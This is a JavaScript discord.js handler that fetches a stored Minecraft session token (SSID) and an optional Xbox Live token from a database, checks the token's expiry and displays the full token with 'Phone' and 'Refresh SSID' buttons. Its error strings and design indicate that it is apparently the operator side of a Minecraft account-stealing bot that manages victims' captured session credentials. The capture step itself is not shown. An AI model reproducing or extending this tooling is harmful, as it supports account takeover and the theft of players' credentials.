const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { queryParams } = require("../../../db/database");
const generate = require('../../utils/generate');

module.exports = {
    name: "ssid",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            let xbl = null;
            console.log(interaction.customId);
            const [_, id, oldTime] = interaction.customId.split("|");

            const result = await queryParams('SELECT action FROM actions WHERE id = ?', [id]);
            if (result.length === 0) {
                return interaction.reply({
                    content: "No data found for this SSID.",
                    ephemeral: true
                });
            }

            const actionData = result[0].action;
            const ssid = actionData.split('|')[1]; 
            if (actionData.split('|')[2]) {
                xbl = actionData.split('|')[2];
            }

            if (!ssid || ssid === "Couldn't Get!" || ssid === "No Minecraft!") {
                return interaction.reply({
                    content: "Couldn't get SSID!",
                    ephemeral: true
                });
            }

            const payload = decodeJwtPayload(ssid);
            if (!payload || !payload.exp) {
                return interaction.reply({ content: `Invalid SSID!`, ephemeral: true });
            }

            const expirationTime = new Date(payload.exp * 1000);
            if (Date.now() > expirationTime.getTime()) {
                return interaction.reply({
                    embeds: [{
                        title: `SSID has been expired!`,
                        color: 0x808080
                    }],
                    ephemeral: true
                });    
            }

            const formattedExpTime = `<t:${Math.floor(expirationTime.getTime() / 1000)}:R>`;
            const rId = generate(32);
            await queryParams(`INSERT INTO actions (id, action) VALUES (?, ?)`, [rId, `phonessid|${ssid}`]);

            const components = [];

            const phoneButton = new ButtonBuilder()
                .setCustomId(`phonessid|${rId}`)
                .setLabel("Phone")
                .setStyle(ButtonStyle.Secondary);

            const row = new ActionRowBuilder().addComponents(phoneButton);
            let hide = true
            if (xbl && !hide) {
                const xblId = generate(32);
                await queryParams(`INSERT INTO actions (id, action) VALUES (?, ?)`, [xblId, `refreshssid|${xbl}`]);

                const refreshButton = new ButtonBuilder()
                    .setCustomId(`action|${xblId}`)
                    .setLabel("Refresh SSID")
                    .setStyle(ButtonStyle.Secondary);

                row.addComponents(refreshButton);
            }

            return interaction.reply({
                embeds: [{
                    title: `Expires: ${formattedExpTime}`,
                    description: "```" + ssid + "```",
                    color: 0x808080
                }],
                components: [row],
                ephemeral: true
            });
        } catch (error) {
            console.error("Error in ssid handler:", error);
            return interaction.reply({
                content: "An error occurred while fetching the SSID.",
                ephemeral: true
            });
        }
    }
};

const decodeJwtPayload = (token) => {
    try {
        const payloadBase64 = token.split('.')[1];
        const payload = Buffer.from(payloadBase64, 'base64').toString('utf-8');
        return JSON.parse(payload);
    } catch (error) {
        return null;
    }
};
